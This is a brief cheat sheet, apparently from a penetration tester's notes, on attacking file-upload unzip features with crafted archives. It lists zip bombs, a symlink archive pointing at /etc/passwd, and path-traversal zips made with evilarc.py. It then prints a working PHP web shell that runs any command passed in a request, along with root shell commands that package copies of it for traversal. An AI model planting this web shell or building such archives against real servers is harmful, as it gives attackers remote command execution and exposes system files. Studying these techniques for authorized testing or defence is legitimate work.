# zip hacks:

* Zip bombs
* Symlink hacks
  * `ln -s /etc/passwd link`
  * `zip --symlinks test.zip link`
* `python ./evilarc.py` can be used to create a zip with "../" in the path
  * Similar to this: https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/
  * Steps below & modify with Hex Fiend


```
# backdoor.php
<?php
if(isset($_REQUEST['cmd'])){
	$cmd = ($_REQUEST['cmd']);
	system($cmd);
}
?>


root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# ls *.php
backdoor.php         xxAxxAxxAcmd.php        xxAxxAxxAxxAxxAxxAcmd.php        xxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php
xxAcmd.php           xxAxxAxxAxxAcmd.php     xxAxxAxxAxxAxxAxxAxxAcmd.php     xxAxxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php
xxAxxAcmd.php        xxAxxAxxAxxAxxAcmd.php  xxAxxAxxAxxAxxAxxAxxAxxAcmd.php
root@s2crew:/tmp# zip cmd.zip xx*.php
  adding: xxAcmd.php (deflated 40%)
  adding: ...
  adding: xxAxxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
```

